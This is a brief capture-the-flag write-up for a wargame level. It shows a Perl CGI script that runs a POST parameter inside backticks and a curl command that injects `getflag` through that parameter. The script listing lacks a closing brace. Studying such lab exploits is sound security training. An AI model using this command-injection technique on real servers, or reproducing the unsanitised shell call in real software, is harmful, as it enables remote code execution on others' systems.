*level04.pl*

->  HTML server - echo the POST *x* parameter
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
x(param("x"));
```

We can inject the command you want in the *x* parameter

```
curl http://localhost:4747/ -d 'x=`getflag`'
```


